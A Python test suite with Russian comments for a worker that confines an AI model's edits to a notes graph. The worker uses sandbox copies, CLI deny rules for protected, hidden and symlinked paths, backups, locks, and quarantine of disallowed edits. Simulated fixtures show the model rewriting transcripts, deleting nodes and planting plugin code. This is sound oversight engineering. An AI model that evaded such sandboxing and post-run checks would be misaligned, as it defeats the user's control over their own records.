"""Фоновый разбор никто не проверял, а правки графа шли без бэкапа.

Две находки аудита, обе про то, что происходит ПОСЛЕ запуска облака.

CHR-AUD-004. `Popen` уходил в фон без таймаута и без проверки кода возврата.
Сообщение «Claude запущен фоном» означало ровно одно: процесс стартовал. Если
он падал, упирался в лимит или отвечал обрывком, в папке встречи оставался
пустой или недописанный файл ревизии — с виду настоящий. Человек узнавал об
этом, только открыв лог, то есть обычно никогда.

CHR-AUD-003. В режиме записи модель правила граф напрямую. Бэкап и границы
того, что можно трогать, existовали только в тексте промпта — то есть держались
на послушании модели, тогда как PRIVACY обещает бэкап перед каждой правкой.

Отсюда воркер: он ждёт процесс с таймаутом, проверяет код возврата и то, что
ответ похож на ревизию, публикует файл атомарно — и в режиме записи снимает
бэкап графа до запуска, а после сверяет, что тронуто только разрешённое.

Границы намеренно узкие. Модель дообогащает граф — узлы, ядра, заметки встреч.
Стенограммы, минутки и раздел «## Правки автора» неприкосновенны: это то, что
написал человек или записала машина с его слов, и облаку там делать нечего.
"""
import contextlib
import os
import pathlib
import sys

REPO = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "scripts"))
sys.path.insert(0, str(REPO / "src"))

import pytest

import cloud_review


@pytest.fixture(autouse=True)
def _no_retry_pause(monkeypatch):
    """Повтор ревизии (№240) в бою спит десять минут и ждёт конца живой
    встречи; тестам нужна логика, не пауза. Тест повтора подменяет
    `_sleep` своим счётчиком поверх этой заглушки."""
    monkeypatch.setattr(cloud_review, "_sleep", lambda s: None)
    monkeypatch.setattr(cloud_review.live_gate, "wait_while_live", lambda *a, **k: False)


@pytest.fixture(autouse=True)
def _no_live_model(модель_не_отвечает):
    """Доставка ревизии пересобирает архив встречи, а он — саммари моделью. Сценарий
    этого файла — «локальной модели нет»; прежняя подмена `_gen_summary` с №314
    мимо архиватора, и отказ сети глотался его `except Exception` (№376)."""
    return модель_не_отвечает


def _graph(tmp: pathlib.Path) -> pathlib.Path:
    graph = tmp / "Работа"
    (graph / "Ядра").mkdir(parents=True)
    (graph / "Встречи").mkdir()
    (graph / "Документация" / "Стенограммы встреч").mkdir(parents=True)
    (graph / "Ядра" / "Платёжный провайдер.md").write_text(
        "# Ядро\n## Статус\nРешено\n\n## Правки автора\n\nруками написанное\n",
        encoding="utf-8")
    (graph / "Встречи" / "2026-07-15_1400.md").write_text("# Встреча\n", encoding="utf-8")
    (graph / "Документация" / "Стенограммы встреч" / "2026-07-15_1400.md").write_text(
        "стенограмма\n", encoding="utf-8")
    return graph


@pytest.fixture(autouse=True)
def _backups_out_of_the_repo(tmp_path, monkeypatch):
    """Снимки и песочницы — в tmp теста, а не в данных установки.

    `backup_root` кладёт их под корень данных ревизии, и на машине разработчика
    это корень репозитория: каждый тест переноса оставлял там каталог. Тест
    приватности (`test_no_voice_biometrics`) сверяет, что в репозитории не
    появилось файлов, и падал, когда случайный порядок ставил его ПОСЛЕ
    этих тестов. Прогон не должен зависеть от порядка."""
    monkeypatch.setattr(cloud_review, "_root", lambda _к=tmp_path / "данные": _к)


def _cloud_worked(graph: pathlib.Path, tmp: pathlib.Path, work) -> tuple:
    """Облако поработало в песочнице — вернуть вердикт переноса и карантин.

    №120: облако больше не пишет в граф. Его cwd — вторая копия, и тест
    обязан изображать именно это: `work(pen)` правит песочницу, а граф
    трогает только перенос. Заодно это проверяет саму изоляцию — сценарий,
    в котором правка «дотянулась» до графа, теперь невоспроизводим.
    """
    qdir = tmp / "q"
    backup = cloud_review.backup_graph(graph, "снимок")
    before = cloud_review.snapshot_rel(backup)
    pen = cloud_review.backup_graph(graph, "песочница", source=backup)
    work(pen)
    v = cloud_review.apply_from_copy(before, pen, graph, qdir,
                                     backup=backup, valid=True)
    return v, qdir


def test_allowed_paths_cover_the_graph_and_nothing_outside(tmp_path):
    graph = _graph(tmp_path)
    assert cloud_review.may_write(graph / "Ядра" / "Платёжный провайдер.md", graph)
    assert cloud_review.may_write(graph / "Встречи" / "2026-07-15_1400.md", graph)
    # за пределами графа — никогда, даже если путь выглядит похоже
    assert not cloud_review.may_write(tmp_path / "config.yaml", graph)
    assert not cloud_review.may_write(graph.parent / "Дневник" / "2026-07-15.md", graph)


def test_snapshot_and_obsidian_folders_are_off_limits(tmp_path):
    """Скрытые каталоги графа — снимки (.cloud_backup, .forget_backup,
    Ядра/.tier3_backup) и служебное Obsidian: писать туда облаку нельзя
    (аудит DeepSeek 16.08)."""
    graph = _graph(tmp_path)
    for hidden in (graph / cloud_review.BACKUP_DIR / "2026-07-14_0300" / "Ядра" / "Х.md",
                   graph / ".forget_backup" / "2026-07-15_1400" / "Х.md",
                   graph / "Ядра" / ".tier3_backup" / "2026-07-14" / "Х.md",
                   graph / ".obsidian" / "workspace.json"):
        assert not cloud_review.may_write(hidden, graph), hidden


def test_hidden_paths_are_seen_and_fenced(tmp_path):
    """Запрет без сверки — не запрет: snapshot и бэкап раньше пропускали
    dot-пути, а `Edit(/**)` их не исключает — правка .obsidian или снимка
    tier3 была невидимой и необратимой (Codex, Critical 22.08)."""
    graph = _graph(tmp_path)
    plugin = graph / ".obsidian" / "plugins" / "x" / "main.js"
    old_core = graph / "Ядра" / ".tier3_backup" / "2026-07-14" / "Старое.md"
    for f, text in ((graph / ".obsidian" / "app.json", "{}\n"),
                    (old_core, "# Старое\nисходник до слияния\n")):
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(text, encoding="utf-8")
    before = cloud_review.snapshot(graph)
    assert str(old_core.resolve()) in before, "снимок не видит скрытые пути"
    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
    assert (backup / "Ядра" / ".tier3_backup" / "2026-07-14" / "Старое.md").exists()
    # исключения: свой же старый снимок внутри графа и живые окна Obsidian
    legacy = graph / cloud_review.BACKUP_DIR / "2026-07-14_0300" / "x.md"
    legacy.parent.mkdir(parents=True); legacy.write_text("x", encoding="utf-8")
    ws = graph / ".obsidian" / "workspace.json"
    ws.write_text("{}", encoding="utf-8")
    enabled = graph / ".obsidian" / "community-plugins.json"
    enabled.write_text("[]", encoding="utf-8")
    now = cloud_review.snapshot(graph)
    assert str(legacy.resolve()) not in now and str(ws.resolve()) not in now
    # состояние Obsidian (app.json) — живое, не сторожим; список включённых
    # плагинов и код плагинов — сторожим
    assert str((graph / ".obsidian" / "app.json").resolve()) not in now
    assert str(enabled.resolve()) in now

    def worked(pen):
        (pen / ".obsidian" / "plugins" / "x").mkdir(parents=True)
        (pen / ".obsidian" / "plugins" / "x" / "main.js").write_text(
            "alert(1)", encoding="utf-8")                      # создан облаком
        (pen / "Ядра" / ".tier3_backup" / "2026-07-14" / "Старое.md").write_text(
            "# Старое\nпереписано облаком\n", encoding="utf-8")

    v, qdir = _cloud_worked(graph, tmp_path, worked)
    assert not plugin.exists(), "код плагина перенесён в граф"
    assert ".obsidian/plugins/x/main.js" in v.removed
    assert (qdir / ".obsidian" / "plugins" / "x" / "main.js").read_text(
        encoding="utf-8") == "alert(1)"
    assert old_core.read_text(encoding="utf-8") == "# Старое\nисходник до слияния\n"
    assert "Ядра/.tier3_backup/2026-07-14/Старое.md" in v.reverted


def test_missing_graph_runs_text_only_instead_of_exposing_transcripts(
        tmp_path, monkeypatch):
    """Wiring: edit=true не выдаёт файловые tools fallback-папке."""
    stamp = "2026-07-15_1400"
    transcripts = tmp_path / "transcripts"
    transcripts.mkdir()
    transcript = transcripts / f"{stamp}.md"
    transcript.write_text("чужой текст встречи\n", encoding="utf-8")
    rev = transcripts / f"{stamp}_ревизия.md"
    log = tmp_path / "cloud.log"
    captured = {}

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        captured["cwd"] = kwargs["cwd"]
        kwargs["stdout"].write(
            "- **Решение:** оставить граф закрытым\n"
            "- **Поручение:** проверить настройку\n"
            "- **Риск:** файловый доступ не выдавался\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    code = cloud_review.run(stamp, transcript, tmp_path / "missing-graph",
                            rev, log, cfg)

    assert code == 0
    cmd = captured["cmd"]
    assert cmd[cmd.index("--tools") + 1] == ""
    assert "--allowedTools" not in cmd
    assert captured["cwd"] == str(transcripts)
    assert "только текст (граф недоступен)" in log.read_text(encoding="utf-8")


def test_transcripts_inside_the_graph_are_untouchable(tmp_path):
    """Копии стенограмм лежат в графе, но правит их конвейер, а не облако."""
    graph = _graph(tmp_path)
    doc = graph / "Документация" / "Стенограммы встреч" / "2026-07-15_1400.md"
    assert not cloud_review.may_write(doc, graph)


def test_author_section_changes_are_rejected(tmp_path):
    """«## Правки автора» — то, что человек написал руками."""
    graph = _graph(tmp_path)
    core = graph / "Ядра" / "Платёжный провайдер.md"
    before = core.read_text(encoding="utf-8")
    after = before.replace("руками написанное", "переписанное облаком")
    assert cloud_review.author_section_changed(before, after)
    ok = before.replace("Решено", "Решено — ЮPay")
    assert not cloud_review.author_section_changed(before, ok)


def test_edits_in_copy_sees_added_changed_deleted_and_skips_untouched(tmp_path):
    graph = _graph(tmp_path)
    backup = cloud_review.backup_graph(graph, "снимок")
    before = cloud_review.snapshot_rel(backup)
    pen = cloud_review.backup_graph(graph, "песочница", source=backup)
    (pen / "Ядра" / "Новое.md").write_text("# Новое\n", encoding="utf-8")
    (pen / "Встречи" / "2026-07-15_1400.md").write_text("# Встреча\nправка\n",
                                                        encoding="utf-8")
    (pen / "Документация" / "Стенограммы встреч" / "2026-07-15_1400.md").unlink()
    rels = {r.as_posix() for r in cloud_review.edits_in_copy(before, pen)}
    assert rels == {"Ядра/Новое.md", "Встречи/2026-07-15_1400.md",
                    "Документация/Стенограммы встреч/2026-07-15_1400.md"}, rels


def test_archive_folders_are_untouchable(tmp_path):
    """Саммари и минутки в архиве — та же категория, что копии стенограмм."""
    graph = _graph(tmp_path)
    arch = graph / "Встречи-архив" / "2026-07-15 14-00 — Платёжный провайдер"
    arch.mkdir(parents=True)
    assert not cloud_review.may_write(arch / "Минутки.md", graph)


def test_deleted_file_is_seen_and_kept_in_graph(tmp_path):
    """Удаление — тоже правка: diff только по живым файлам его не видел."""
    graph = _graph(tmp_path)
    core = graph / "Ядра" / "Платёжный провайдер.md"
    rel = "Ядра/Платёжный провайдер.md"
    v, _ = _cloud_worked(graph, tmp_path,
                         lambda pen: (pen / rel).unlink())
    assert core.exists(), "удаление облака дошло до графа"
    # Удаление НЕ переносится вовсе: у облака нет причин стирать узлы, а
    # «восстановление» и было тем откатом, что унёс соседнюю встречу (№119).
    assert rel in v.deleted and not v.removed and not v.applied


def test_deleting_a_node_without_author_section_is_a_violation(tmp_path):
    """Удаление — нарушение всегда, не только при пропавших «Правках автора».

    У ядер, людей и систем в проде этого раздела нет, и их стирание
    проходило как «правка» и считалось в «правок графа: N» (Sonnet, Codex
    22.08). Переименование — тоже удаление плюс создание: старый файл
    возвращается, новый остаётся, в логе — отдельное слово.
    """
    graph = _graph(tmp_path)
    person = graph / "Люди" / "Иванов.md"
    person.parent.mkdir()
    person.write_text("# Иванов\n- **Роль:** аналитик\n", encoding="utf-8")
    cloud_review.snapshot(graph)
    cloud_review.backup_graph(graph, "2026-07-15_1400")
    def renamed(pen):                                       # «переименовал»
        (pen / "Люди" / "Иванов.md").rename(pen / "Люди" / "Иванов И.md")

    v, qdir = _cloud_worked(graph, tmp_path, renamed)
    assert person.read_text(encoding="utf-8") == "# Иванов\n- **Роль:** аналитик\n"
    assert v.deleted == ["Люди/Иванов.md"]
    assert "Люди/Иванов И.md" in v.applied, "новое имя не перенесено"
    line = cloud_review._verdict_line(v, qdir)
    assert "облако стёрло — в графе ОСТАВЛЕНО: Люди/Иванов.md" in line


def test_a_new_file_in_the_pipelines_folder_survives_a_valid_report(tmp_path):
    """Артефакт разбора соседней встречи переживает УСПЕШНУЮ ревизию.

    Круг-8, DS Critical: дыру №119 закрыли только в ветке отката, а при
    валидном отчёте новый файл в защищённой папке по-прежнему уезжал в
    карантин. Отчёт облака не перечисляет созданное им, так что «ответ
    валиден» об авторстве не говорит ничего, — а конвейер пишет `_live`,
    `_minutes`, `_hints` и `_разбор` именно туда и замка графа не берёт.
    Успешных ревизий больше, чем провалившихся: дыра была шире исходной.
    """
    graph = _graph(tmp_path)
    artefact = graph / "Документация" / "Стенограммы встреч" / "2026-07-15_1500_Статус_minutes.md"

    # №120 закрывает эту дыру по построению: конвейер пишет в ГРАФ, облако —
    # в песочницу, и перенос ходит только по правкам песочницы. Файл, которого
    # облако не касалось, для переноса просто не существует.
    def worked(pen):
        artefact.write_text("минутки соседней встречи\n", encoding="utf-8")
        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
            "# Встреча\nобогатило облако\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, worked)

    assert artefact.is_file(), "минутки соседней встречи унесены при валидном отчёте"
    assert artefact.name not in str(v.removed + v.reverted + v.deleted)
    assert v.applied == ["Встречи/2026-07-15_1400.md"]



def test_non_markdown_files_are_covered_too(tmp_path):
    """Граница стережёт граф, а не расширение .md."""
    graph = _graph(tmp_path)
    data = graph / "Документация" / "Стенограммы встреч" / "запись.vtt"
    data.write_text("WEBVTT\n", encoding="utf-8")
    rel = "Документация/Стенограммы встреч/запись.vtt"
    v, _ = _cloud_worked(graph, tmp_path, lambda pen: (pen / rel).write_text(
        "WEBVTT\nоблако дописало\n", encoding="utf-8"))
    assert data.read_text(encoding="utf-8") == "WEBVTT\n", \
        "правка не-markdown файла в защищённой папке перенесена в граф"
    assert rel in v.reverted


def test_invalid_answer_rolls_back_even_allowed_edits(tmp_path, monkeypatch):
    """Без отчёта правки графа — неизвестной степени готовности: слияние
    могло дойти до середины. Код ≠ 0 или обрывок — откат всего, версии
    облака в карантине (Codex, Critical 22.08)."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcripts = tmp_path / "transcripts"; transcripts.mkdir()
    transcript = transcripts / f"{stamp}.md"
    transcript.write_text("текст встречи\n", encoding="utf-8")
    rev, log = transcripts / f"{stamp}_ревизия.md", tmp_path / "cloud.log"
    core = graph / "Ядра" / "Платёжный провайдер.md"
    original = core.read_text(encoding="utf-8")
    monkeypatch.setattr(cloud_review, "_root", lambda _к=tmp_path / "data": _к)

    class Result:
        returncode = 1

    def fake_run(cmd, **kwargs):
        # №120: облако правит КОПИЮ (cwd подпроцесса), а не живой граф.
        pen = pathlib.Path(kwargs["cwd"])
        (pen / "Ядра" / "Платёжный провайдер.md").write_text(
            original.replace("Решено", "Решено — ЮPay"), encoding="utf-8")
        (pen / "Люди").mkdir(exist_ok=True)
        (pen / "Люди" / "Новый.md").write_text("# Новый\n", encoding="utf-8")
        kwargs["stdout"].write("Ошибка: rate limit\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    # ненулевой код CLI — повторяемый сбой (№240): второй заход тот же, код RC_CLI
    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == cloud_review.RC_CLI
    # №120: облако работало в копии, поэтому «откат» исчез как класс —
    # настоящий граф не менялся ни на байт, и доказывать это не нужно
    # сложной сверкой. Ядро осталось прежним, созданный узел в граф не попал.
    assert core.read_text(encoding="utf-8") == original, "граф всё-таки тронут"
    assert not (graph / "Люди" / "Новый.md").exists(), (
        "созданный облаком узел просочился в граф при невалидном ответе"
    )
    # А посмотреть, что наработало облако, человек может: правки копии
    # уехали в карантин — иначе они пропали бы с ротацией снимков.
    q = next(cloud_review.quarantine_root(graph).glob(f"{stamp}-*"))   # штамп + время
    assert "ЮPay" in (q / "Ядра" / "Платёжный провайдер.md").read_text(encoding="utf-8")
    assert (q / "Люди" / "Новый.md").is_file()
    text = log.read_text(encoding="utf-8")
    assert "граф не тронут" in text and "правок облака 2" in text


def test_graph_lock_serialises_workers_and_degrades_to_read_only(tmp_path, monkeypatch):
    """Второй воркер того же графа ждёт первого; не дождался — чтение.

    Раньше он ротировал живой снимок соседа, и тот пропускал сверку: любые
    правки проходили без проверки (Codex, Critical 22.08)."""
    import fcntl
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    monkeypatch.setattr(cloud_review, "_root", lambda _к=tmp_path / "data": _к)
    with cloud_review.graph_lock(graph, wait=0) as first:
        assert first is True
        with cloud_review.graph_lock(graph, wait=0.2) as second:
            assert second is False
    # замок отпущен вместе с дескриптором — третий берёт сразу
    with cloud_review.graph_lock(graph, wait=0) as third:
        assert third is True

    # а run() под чужим замком уходит на чтение: ни Edit, ни снимка
    transcripts = tmp_path / "transcripts"; transcripts.mkdir()
    transcript = transcripts / f"{stamp}.md"
    transcript.write_text("текст встречи\n", encoding="utf-8")
    rev, log = transcripts / f"{stamp}_ревизия.md", tmp_path / "cloud.log"
    captured = {}

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        kwargs["stdout"].write(
            "- **Решение:** оставить граф закрытым\n"
            "- **Поручение:** проверить настройку\n"
            "- **Риск:** файловый доступ не выдавался\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    monkeypatch.setattr(cloud_review, "LOCK_WAIT", 0.2)
    lock_file = cloud_review.backup_root(graph).parent / "cloud.lock"
    lock_file.parent.mkdir(parents=True, exist_ok=True)
    fd = lock_file.open("w")
    fcntl.flock(fd, fcntl.LOCK_EX)
    try:
        cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
        assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 0
    finally:
        fd.close()
    cmd = captured["cmd"]
    assert "Edit" in cmd[cmd.index("--disallowedTools"):], "под чужим замком выдан Edit"
    assert not (cloud_review.backup_root(graph) / stamp).exists()
    assert "только чтение графа" in log.read_text(encoding="utf-8")


def test_quarantine_keeps_only_recent_runs(tmp_path):
    root = tmp_path / "q"
    for s in ("2026-07-01_1000", "2026-07-02_1000", "2026-07-03_1000"):
        (root / s).mkdir(parents=True)
    (root / "cloud.lock").write_text("", encoding="utf-8")
    cloud_review.rotate_quarantine(root, keep=2)
    assert sorted(p.name for p in root.iterdir()) == [
        "2026-07-02_1000", "2026-07-03_1000", "cloud.lock"]


def test_report_must_look_like_a_review(tmp_path):
    """Пустой или обрезанный ответ не должен публиковаться как ревизия."""
    assert not cloud_review.looks_like_report("")
    assert not cloud_review.looks_like_report("   \n\n")
    assert not cloud_review.looks_like_report("Ошибка: rate limit")
    good = "- **Решение:** взяли ЮPay\n- **Поручение:** договор до 22.07\n" * 2
    assert cloud_review.looks_like_report(good)


def test_publish_is_atomic_and_keeps_a_partial_answer(tmp_path):
    """Обрыв не должен оставлять файл-обманку, но и терять текст не надо."""
    rev = tmp_path / "ревизия.md"
    tmp = tmp_path / "ревизия.md.part"
    tmp.write_text("обрывок", encoding="utf-8")
    published = cloud_review.publish(tmp, rev, ok=False)
    assert not published
    assert not rev.exists(), "недоделанная ревизия опубликована как готовая"
    assert (tmp_path / "ревизия.md.partial").exists(), "текст ответа потерян"

    tmp.write_text("- **Решение:** ок\n" * 5, encoding="utf-8")
    assert cloud_review.publish(tmp, rev, ok=True)
    assert rev.read_text(encoding="utf-8").startswith("- **Решение:**")
    assert not tmp.exists()


def test_published_review_reaches_the_archive_and_the_vault(tmp_path, monkeypatch):
    """Ревизия облака публиковалась позже архива и копий в Документацию, а
    повторно их никто не собирал — в read-only режиме она оставалась в
    transcripts/, невидимой ни в Finder-архиве, ни в графе (аудит GLM 17.08)."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    (graph / "Встречи-архив").mkdir()
    (graph / "Документация" / "Стенограммы встреч").mkdir(parents=True, exist_ok=True)
    transcripts = tmp_path / "transcripts"
    transcripts.mkdir()
    transcript = transcripts / f"{stamp}_Платёжный_провайдер.md"
    transcript.write_text("стенограмма\n", encoding="utf-8")
    rev = transcripts / f"{stamp}_Платёжный_провайдер_ревизия_claude.md"
    log = tmp_path / "cloud.log"

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        kwargs["stdout"].write("# Ревизия\n\n- **Решение:** ЮPay\n- **Поручение:** договор\n- **Риск:** сроки\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": False}}
    code = cloud_review.run(stamp, transcript, graph, rev, log, cfg)

    assert code == 0 and rev.exists()
    folder = graph / "Встречи-архив" / "2026-07-15 14-00 — Платёжный провайдер"
    assert (folder / "Ревизия Claude.md").exists(), "ревизия не доехала до архива встречи"
    assert (folder / "Стенограмма.md").exists()
    assert (graph / "Документация" / "Стенограммы встреч" / rev.name).exists(), \
        "ревизия не доехала до Документации"
    assert "ревизия доставлена" in log.read_text(encoding="utf-8")


def test_review_of_an_untitled_meeting_lands_in_its_own_folder(tmp_path, monkeypatch):
    """Посекундная встреча без темы: остаток стема «30» — секунды, а не тема
    (ревью 17.08); ревизия названа минутным штампом и в папку кладётся явно."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    (graph / "Встречи-архив").mkdir()
    existing = graph / "Встречи-архив" / "2026-07-15 14-00 — встреча"
    existing.mkdir()
    transcripts = tmp_path / "transcripts"
    transcripts.mkdir()
    transcript = transcripts / f"{stamp}30.md"
    transcript.write_text("стенограмма\n", encoding="utf-8")
    rev = transcripts / f"{stamp}_ревизия_claude.md"
    log = tmp_path / "cloud.log"

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        kwargs["stdout"].write("# Ревизия\n\n- **Решение:** да\n- **Поручение:** нет\n- **Риск:** есть\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    code = cloud_review.run(stamp, transcript, graph, rev, log,
                            {"sufler": {"cloud_enrich": True, "cloud_edit_graph": False}})

    assert code == 0
    assert not (graph / "Встречи-архив" / "2026-07-15 14-00 — 30").exists(), "секунды стали темой папки"
    assert (existing / "Ревизия Claude.md").exists(), "ревизия не легла в папку встречи"


def test_symlink_reading_is_denied_in_both_modes(tmp_path):
    """Симлинку закрыто ЧТЕНИЕ, и в режиме чтения тоже.

    Цель симлинка лежит вне графа, `Read(/**)` лексически её накрывает, а
    в read-only режиме deny-правил не было вовсе: граница держалась только
    на резолве путей внутри CLI (живая проверка 26.08: он отклоняет — но
    пояс на своей стороне стоит одну строку). Защищённые папки читать
    по-прежнему можно: закрыта только запись.
    """
    graph = _graph(tmp_path)
    outside = tmp_path / "снаружи"; outside.mkdir()
    (graph / "link_out").symlink_to(outside, target_is_directory=True)
    (graph / "Ядра" / "ссылка.md").symlink_to(outside / "x.md")
    (graph / ".DS_Store").write_text("", encoding="utf-8")

    links = dict(cloud_review.deny_paths(graph, symlinks_only=True))
    assert links == {"link_out": True, "Ядра/ссылка.md": False}, links

    for may_edit in (False, True):
        cmd = cloud_review.graph_updater.cloud_enrich_command(
            {"sufler": {"cloud_enrich": True, "cloud_edit_graph": may_edit}},
            claude_bin="claude", prompt="p", model="m", may_edit=may_edit,
            deny_paths=cloud_review.deny_paths(graph) if may_edit else (),
            symlink_paths=links.items())
        tail = cmd[cmd.index("--disallowedTools"):cmd.index("--permission-mode")]
        assert "Read(/link_out/**)" in tail, (may_edit, tail)
        assert "Read(/Ядра/ссылка.md)" in tail, (may_edit, tail)
        # чтение защищённой папки остаётся: модель обязана понимать граф
        assert "Read(/Встречи-архив/**)" not in tail


def test_deny_paths_close_protected_hidden_and_symlinked_places(tmp_path):
    """Первый слой — правила CLI: защищённые папки, скрытые каталоги и файлы,
    симлинки (rglob симлинк-каталог не обходит, а цель может быть вне графа;
    Codex, Critical круг-1 по #381). Проверено живым запуском 22.08: deny с
    путём под dontAsk отклоняет запись, соседний разрешённый путь пишется."""
    graph = _graph(tmp_path)
    (graph / ".obsidian" / "plugins" / "x").mkdir(parents=True)
    (graph / ".obsidian" / "plugins" / "x" / "main.js").write_text("", encoding="utf-8")
    (graph / "Ядра" / ".tier3_backup").mkdir()
    (graph / ".DS_Store").write_text("", encoding="utf-8")
    outside = tmp_path / "снаружи"; outside.mkdir()
    (graph / "attachments").symlink_to(outside, target_is_directory=True)
    (graph / "Ядра" / "ссылка.md").symlink_to(outside / "x.md")
    denied = dict(cloud_review.deny_paths(graph))
    assert denied == {
        "Документация/Стенограммы встреч": True, "Встречи-архив": True,
        ".DS_Store": False, ".obsidian": True, "attachments": True,
        "Ядра/.tier3_backup": True, "Ядра/ссылка.md": False}, denied
    rules = cloud_review.graph_updater.deny_rules(cloud_review.deny_paths(graph))
    assert "Edit(/.obsidian/**)" in rules and "Edit(/attachments/**)" in rules
    assert "Edit(/Ядра/ссылка.md)" in rules and "Edit(/Встречи-архив/**)" in rules
    cmd = cloud_review.graph_updater.cloud_enrich_command(
        {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}},
        claude_bin="claude", prompt="p", model="m", may_edit=True,
        deny_paths=cloud_review.deny_paths(graph))
    tail = cmd[cmd.index("--disallowedTools"):cmd.index("--permission-mode")]
    assert "Edit(/attachments/**)" in tail and "Edit(/.obsidian/**)" in tail
    # симлинки не входят в снимок: «откат» такого файла правил бы чужое место
    (outside / "x.md").write_text("чужое", encoding="utf-8")
    assert not any("ссылка.md" in k for k in cloud_review.snapshot(graph))


def test_one_broken_file_does_not_stop_the_check(tmp_path, monkeypatch):
    """Ошибка карантина/диска на одном файле — в `failed`, остальные
    сверены; воркер не падает до ротации и не оставляет нарушения базой
    следующего снимка (круг-1 по #381, DS + Codex)."""
    graph = _graph(tmp_path)
    doc = graph / "Документация" / "Стенограммы встреч" / "2026-07-15_1400.md"
    core = graph / "Ядра" / "Платёжный провайдер.md"
    real = cloud_review.quarantine

    def flaky(path, *a, **k):
        if path.name == doc.name:
            raise OSError(28, "No space left on device")
        return real(path, *a, **k)

    monkeypatch.setattr(cloud_review, "quarantine", flaky)

    def worked(pen):
        (pen / "Документация" / "Стенограммы встреч" / doc.name).write_text(
            "переписано", encoding="utf-8")
        (pen / "Ядра" / core.name).write_text(
            "# Ядро\n## Статус\nРешено\n\n## Правки автора\n\nстёрто\n",
            encoding="utf-8")

    v, qdir = _cloud_worked(graph, tmp_path, worked)
    assert v.failed == [f"Документация/Стенограммы встреч/{doc.name}"]
    assert f"Ядра/{core.name}" in v.reverted
    assert "ПЕРЕНОС НЕ СМОГ" in cloud_review._verdict_line(v, qdir)


def test_check_runs_even_if_publishing_blows_up(tmp_path, monkeypatch):
    """Исключение после вызова claude (битый stdout, исчезнувший файл) не
    должно обходить сверку: она в finally (круг-1 по #381, Codex Critical)."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcripts = tmp_path / "transcripts"; transcripts.mkdir()
    transcript = transcripts / f"{stamp}.md"
    transcript.write_text("текст\n", encoding="utf-8")
    rev, log = transcripts / f"{stamp}_ревизия.md", tmp_path / "cloud.log"
    doc = graph / "Документация" / "Стенограммы встреч" / f"{stamp}.md"

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        pen = pathlib.Path(kwargs["cwd"])
        (pen / "Документация" / "Стенограммы встреч" / f"{stamp}.md").write_text(
            "облако переписало стенограмму", encoding="utf-8")
        kwargs["stdout"].write("- **a:** 1\n- **b:** 2\n- **c:** 3 " + "x" * 60 + "\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    monkeypatch.setattr(cloud_review, "publish", lambda *a, **k: 1 / 0)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    import pytest
    with pytest.raises(ZeroDivisionError):
        cloud_review.run(stamp, transcript, graph, rev, log, cfg)
    assert doc.read_text(encoding="utf-8") == "стенограмма\n", (
        "правка облака дошла до графа, хотя публикация упала"
    )
    # Перенос идёт в finally: исключение по дороге не отменяет ни разбор
    # правок, ни запись о них (круг-1 по #381, Codex Critical).
    assert "граф не тронут" in log.read_text(encoding="utf-8")
    assert not (cloud_review.backup_root(graph) / "другой").exists()


def test_worker_without_lock_does_not_deliver_into_the_graph(tmp_path, monkeypatch):
    """Не дождавшийся замка работает на чтение и ревизию в граф не кладёт:
    сосед, который ещё сверяет, принял бы её за правку облака (Codex)."""
    import fcntl
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcripts = tmp_path / "transcripts"; transcripts.mkdir()
    transcript = transcripts / f"{stamp}.md"
    transcript.write_text("текст\n", encoding="utf-8")
    rev, log = transcripts / f"{stamp}_ревизия.md", tmp_path / "cloud.log"

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        kwargs["stdout"].write("- **Решение:** оставить\n- **Поручение:** проверить\n"
                               "- **Риск:** доступ не выдавался\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    monkeypatch.setattr(cloud_review, "LOCK_WAIT", 0.2)
    lock_file = cloud_review.backup_root(graph).parent / "cloud.lock"
    lock_file.parent.mkdir(parents=True, exist_ok=True)
    with lock_file.open("w") as fd:
        fcntl.flock(fd, fcntl.LOCK_EX)
        cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
        assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 0
    assert rev.exists()
    assert not (graph / "Документация" / "Стенограммы встреч" / rev.name).exists()
    assert not (graph / "Встречи-архив").exists()


